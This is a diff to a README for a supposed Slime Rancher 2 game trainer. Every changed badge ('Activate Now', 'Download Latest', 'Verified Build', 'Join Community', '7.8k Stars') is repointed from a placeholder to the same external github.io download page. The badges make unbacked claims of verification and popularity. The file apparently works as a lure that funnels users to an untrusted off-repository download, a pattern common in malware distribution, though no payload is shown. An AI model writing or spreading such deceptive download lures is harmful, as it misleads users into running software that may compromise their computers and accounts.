@@ -23,10 +23,10 @@ This trainer is built for **single-player efficiency and customization**. Whethe
 
 ---
 
-[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](#)
-[![⭐️ 7.8k Stars](https://img.shields.io/badge/GitHub-7.8k_Stars-green?logo=github\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](#)
+[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](https://slime-rancher-2-trainer.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](https://slime-rancher-2-trainer.github.io/.github/)
+[![⭐️ 7.8k Stars](https://img.shields.io/badge/GitHub-7.8k_Stars-green?logo=github\&style=for-the-badge)](https://slime-rancher-2-trainer.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](https://slime-rancher-2-trainer.github.io/.github/)
 
 ---
 
@@ -153,8 +153,8 @@ A: Yes, disable the trainer or press `Reset` in the overlay.
 
 The **Slime Rancher 2 Trainer** brings **resource boosts, slime management, and exploration assists** into one package. Whether you’re farming plorts, building out your ranch, or exploring new biomes, it lets you enjoy the game at your own pace.
 
-[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](#)
-[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](#)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](https://slime-rancher-2-trainer.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](https://slime-rancher-2-trainer.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](https://slime-rancher-2-trainer.github.io/.github/)
 
 ---
